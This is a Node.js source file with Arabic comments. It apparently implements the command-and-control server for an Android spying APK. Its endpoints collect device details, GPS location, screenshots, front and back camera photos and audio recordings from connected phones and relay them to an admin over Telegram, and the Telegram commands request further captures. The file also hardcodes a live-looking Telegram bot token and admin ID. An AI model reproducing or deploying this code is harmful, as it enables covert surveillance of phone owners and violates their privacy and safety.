const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// 🔐 الإعدادات - نفس يلي بالكود المشفر
const TELEGRAM_TOKEN = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const ADMIN_ID = '7604667042';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// 📱 تخزين بيانات الأجهزة
let devices = new Map();

// 🛠️ إعداد Express بنفس طريقة الكود المشفر
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🌐 Endpoints بنفس يلي بالكود المشفر
app.post('/apk/connect', (req, res) => {
    console.log('📱 اتصال من APK:', req.body);
    
    const { device_id, device_info, android_version, battery } = req.body;
    
    // حفظ بيانات الجهاز
    devices.set(device_id, {
        id: device_id,
        info: device_info,
        android: android_version,
        battery: battery,
        connected: true,
        lastSeen: new Date(),
        ip: req.ip
    });
    
    console.log(`✅ جهاز متصل: ${device_id}`);
    
    // إشعار للتلجرام
    bot.sendMessage(ADMIN_ID, 
        `📱 **جهاز جديد متصل**\n` +
        `📟 ${device_info}\n` +
        `🔋 ${battery}%\n` +
        `🤖 ${android_version}`
    );
    
    res.json({ 
        status: 'success',
        message: 'Connected successfully',
        server_time: Date.now()
    });
});

app.post('/apk/location', (req, res) => {
    console.log('📍 موقع من APK:', req.body);
    
    const { device_id, latitude, longitude, accuracy } = req.body;
    
    // تحديث موقع الجهاز
    const device = devices.get(device_id);
    if (device) {
        device.location = { latitude, longitude, accuracy };
        device.lastSeen = new Date();
    }
    
    // إرسال الموقع للتلجرام
    bot.sendMessage(ADMIN_ID,
        `📍 **موقع الجهاز**\n` +
        `🌍 ${latitude}, ${longitude}\n` +
        `🎯 ${accuracy}m\n` +
        `📱 ${device_id}`
    );
    
    res.json({ status: 'success' });
});

app.post('/apk/upload', (req, res) => {
    console.log('📁 رفع ملف من APK:', req.body);
    
    const { device_id, file_type, file_data, timestamp } = req.body;
    
    // معالجة الملف حسب النوع
    let message = '';
    switch(file_type) {
        case 'screenshot':
            message = '📸 لقطة شاشة جديدة';
            break;
        case 'camera_front':
            message = '🤳 صورة كاميرا أمامية';
            break;
        case 'camera_back':
            message = '📷 صورة كاميرا خلفية';
            break;
        case 'audio':
            message = '🎙️ تسجيل صوتي';
            break;
        default:
            message = `📁 ملف: ${file_type}`;
    }
    
    bot.sendMessage(ADMIN_ID, `${message}\n📱 من: ${device_id}`);
    
    res.json({ status: 'success', received: true });
});

app.post('/apk/command', (req, res) => {
    console.log('🎯 أمر من APK:', req.body);
    
    const { device_id, command, data } = req.body;
    
    // معالجة الأوامر الواردة من APK
    res.json({ status: 'success', executed: true });
});

// 🎯 إرسال أوامر للـ APK
app.post('/send_command', (req, res) => {
    const { device_id, command, parameters } = req.body;
    
    console.log(`📤 إرسال أمر لـ ${device_id}: ${command}`, parameters);
    
    // هنا رح نرسل الأمر للـ APK
    res.json({ 
        status: 'success', 
        message: 'Command sent to device',
        command_id: Date.now()
    });
});

// 🤖 أوامر التلجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Unauthorized');
    }
    
    const deviceCount = devices.size;
    
    bot.sendMessage(chatId, 
        `🤖 **Phone Control System**\n\n` +
        `📱 Connected devices: ${deviceCount}\n` +
        `🔗 Server: Active\n\n` +
        `Available commands:\n` +
        `/status - System status\n` +
        `/devices - Connected devices\n` +
        `/location - Get location\n` +
        `/screenshot - Take screenshot\n` +
        `/camera - Capture camera\n` +
        `/audio - Record audio\n` +
        `/vibrate - Vibrate device`
    );
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_ID) return;
    
    const deviceCount = devices.size;
    const activeDevices = Array.from(devices.values()).filter(d => d.connected).length;
    
    bot.sendMessage(chatId,
        `📊 **System Status**\n\n` +
        `📱 Devices: ${deviceCount} (${activeDevices} active)\n` +
        `🟢 Status: Running\n` +
        `⏰ Uptime: ${process.uptime().toFixed(0)}s\n` +
        `💾 Memory: ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB`
    );
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_ID) return;
    
    if (devices.size === 0) {
        return bot.sendMessage(chatId, '❌ No devices connected');
    }
    
    let devicesList = '📱 **Connected Devices:**\n\n';
    
    devices.forEach((device, deviceId) => {
        const status = device.connected ? '🟢' : '🔴';
        devicesList += `${status} ${deviceId}\n`;
        devicesList += `📟 ${device.info}\n`;
        devicesList += `🔋 ${device.battery}% | 🤖 ${device.android}\n`;
        devicesList += `🕒 ${device.lastSeen.toLocaleTimeString()}\n\n`;
    });
    
    bot.sendMessage(chatId, devicesList);
});

bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_ID) return;
    
    bot.sendMessage(chatId, '📍 Requesting location from devices...');
});

bot.onText(/\/screenshot/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_ID) return;
    
    bot.sendMessage(chatId, '📸 Taking screenshot...');
});

// 🌐 صفحة ويب بسيطة
app.get('/', (req, res) => {
    const deviceCount = devices.size;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phone Control System</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    padding: 50px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    max-width: 600px;
                    margin: 0 auto;
                }
                .status {
                    background: ${deviceCount > 0 ? '#28a745' : '#dc3545'};
                    padding: 15px;
                    border-radius: 10px;
                    margin: 20px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🤖 Phone Control System</h1>
                <div class="status">
                    ${deviceCount > 0 ? 
                        `✅ System Active - ${deviceCount} devices connected` : 
                        '❌ No devices connected'
                    }
                </div>
                <p><strong>User:</strong> George96399</p>
                <p><strong>Telegram ID:</strong> ${ADMIN_ID}</p>
                <p><strong>Endpoints:</strong></p>
                <ul style="text-align: left;">
                    <li>POST /apk/connect</li>
                    <li>POST /apk/location</li>
                    <li>POST /apk/upload</li>
                    <li>POST /apk/command</li>
                    <li>POST /send_command</li>
                </ul>
            </div>
        </body>
        </html>
    `);
});

// 🚀 بدء التشغيل
app.listen(port, () => {
    console.log('🚀 Server running on port:', port);
    console.log('📱 Ready for APK connections');
    
    bot.sendMessage(ADMIN_ID, 
        '🚀 **System Started**\n\n' +
        '📡 Server is now listening for APK connections\n' +
        '🌐 Endpoints are ready'
    );
});
